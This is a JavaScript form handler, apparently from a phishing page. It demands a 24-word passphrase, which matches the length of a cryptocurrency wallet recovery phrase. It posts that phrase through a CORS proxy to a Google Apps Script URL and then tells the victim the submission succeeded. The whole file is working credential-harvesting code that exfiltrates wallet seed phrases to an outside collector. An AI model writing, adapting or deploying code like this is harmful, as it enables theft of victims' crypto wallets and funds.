function handleSubmit(event) {
    event.preventDefault();

    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';

    const myButton = document.getElementById('b1');
    myButton.disabled = true;

    const myButton2 = document.getElementById('b2');
    myButton2.disabled = true;

    // Get the passphrase input value
    const form = document.getElementById('myForm'); 
    const inputValue = form.elements['mf-texts'].value.trim();

    // Ensure exactly 24 words
    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return;
    }

    // Google Apps Script URL
    const scriptURL = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec";
    const proxyURL = "https://api.allorigins.win/raw?url=" + encodeURIComponent(scriptURL);

    // Send POST request
    fetch(proxyURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ passphrase: inputValue })
    })
    .then(response => response.json())
    .then(data => {
        console.log("File saved:", data.fileUrl);
        errorElement.textContent = "Submission Successful!";
        form.reset();
    })
    .catch(error => {
        console.error("Error:", error);
        errorElement.textContent = "Error submitting passphrase.";
    })
    .finally(() => {
        myButton.disabled = false;
        myButton2.disabled = false;
    });
}

// Attach event listener
document.getElementById('myForm').addEventListener('submit', handleSubmit);

